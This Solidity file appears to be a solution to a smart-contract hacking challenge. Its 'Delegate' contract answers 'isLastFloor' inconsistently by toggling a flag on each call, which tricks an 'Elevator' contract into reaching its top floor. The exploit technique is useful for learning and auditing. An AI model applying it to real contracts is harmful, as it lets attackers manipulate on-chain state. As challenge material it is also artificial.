// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Elevator} from "./Elevator.sol";

contract Delegate {
    Elevator elevator;
    bool top = true ;

    constructor(Elevator _elevator){
        elevator = _elevator;
    }
    
    function isLastFloor(uint256) public returns(bool) {
        top = !top;
        return top;
    }

    function setTop(uint _floor) public {
        elevator.goTo(_floor);
    }

}